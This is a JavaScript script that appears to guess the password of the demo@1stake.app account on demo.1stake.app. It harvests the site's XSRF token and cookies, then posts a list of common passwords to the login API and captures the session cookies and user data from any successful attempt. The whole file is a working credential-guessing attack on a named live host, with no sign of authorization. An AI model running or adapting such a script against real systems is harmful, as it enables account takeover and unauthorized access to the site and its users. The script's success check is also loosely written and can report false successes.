async function testLoginCredentials() {
  const initRes = await fetch('https://demo.1stake.app/login', {
    headers: { 'User-Agent': 'Mozilla/5.0' }
  });
  const cookies = initRes.headers.get('set-cookie') || '';
  const xsrfMatch = cookies.match(/XSRF-TOKEN=([^;]+)/);
  const xsrfToken = xsrfMatch ? decodeURIComponent(xsrfMatch[1]) : '';
  const cookieHeader = cookies.split(',').map(c => c.split(';')[0]).join('; ');

  const passwords = ['secret', 'password', 'demo', 'demo123', 'admin', '123456', '12345678', 'demo@1stake.app'];
  
  for (const pwd of passwords) {
    try {
      const res = await fetch('https://demo.1stake.app/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
          'X-XSRF-TOKEN': xsrfToken,
          'Cookie': cookieHeader,
          'User-Agent': 'Mozilla/5.0'
        },
        body: JSON.stringify({
          email: 'demo@1stake.app',
          password: pwd
        })
      });

      const json = await res.json();
      console.log('Trying password:', pwd, '-> Status:', res.status, json);
      if (res.status === 200 && json.token || json.success || json.user) {
        console.log('SUCCESSFUL LOGIN! User:', json);
        return { cookies: res.headers.get('set-cookie'), data: json };
      }
    } catch (e) {
      console.error(pwd, e.message);
    }
  }
}

testLoginCredentials();
